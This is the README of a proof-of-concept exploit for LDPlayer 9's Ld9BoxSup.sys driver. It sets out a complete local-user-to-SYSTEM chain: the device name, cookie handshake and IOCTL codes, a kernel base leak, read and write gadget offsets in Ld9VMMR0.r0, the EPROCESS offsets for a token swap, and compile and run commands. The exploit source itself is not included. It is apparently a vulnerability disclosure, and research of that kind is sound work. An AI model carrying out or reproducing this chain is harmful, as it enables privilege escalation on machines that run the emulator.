# LDPlayer / Ld9BoxSup.sys

local user to system on LDPlayer 9. the support driver is a virtualbox 6.1.50
supdrv fork and the cookie gate doesn't gate anything.

- driver: `Ld9BoxSup.sys`
- device: `\Device\Ld9BoxDrv`
- resident module: `Ld9VMMR0.r0`
- built/tested on win11 26200

## files

- `ldpoc.c` leak to kernel r/w to token swap to system shell
- `ld_suptable.h` supdrv export RVAs for the base vote
- `RebootPoC/` a separate config-only chain, its own readme

## chain

open the device, do the COOKIE (0x228204) handshake. QUERY_FUNCS (0x228208)
gives the export pfns, vote them against `ld_suptable.h` for the driver base.
LDR_OPEN (0x22820C) leaks the resident `Ld9VMMR0.r0` base. it's already mapped
because the emulator has run, so the poc reuses it instead of LDR_LOAD, which
would wake GVMM up and bite. if the leak comes back zero, start LDPlayer once and
run it again.

PAGE_ALLOC_EX (0x228228) for the dual-mapped pDrvIns page, GVMMR0CreateVM for a
private gvm, then the op140 VMMR0 path drives two gadgets in the resident r0:

```
read   r0+0xCA0F2   mov eax,[r8+8]; mov [rdx+0xc],eax; ret
write  r0+0x3B988   mov dword ptr [r8+0x28],edx; ret
```

the read gadget also scribbles to [rdx+0xc], so a low page is parked to catch it.

nt comes from the driver IAT: drv+0x36170 is `PsGetCurrentProcessId`, walk down
to the MZ, confirm the export resolves back to that slot, resolve
`PsInitialSystemProcess`. read system's token, walk ActiveProcessLinks to your
own EPROCESS, write the token over yours. dup it onto the console session, cmd
on the desktop.

offsets: pid 0x1D0, links 0x1D8, token 0x248.

## build & run

```
cl /O2 ldpoc.c /link advapi32.lib
x86_64-w64-mingw32-gcc -O2 ldpoc.c -o ldpoc.exe -ladvapi32
ldpoc.exe
```

LDPlayer has to have run once this boot so the r0 is resident. every stage checks
a canonical address / MZ before using a leaked pointer, so a wrong build dies
instead of corrupting anything.

```
     -- _SiCk // afflicted.sh
```
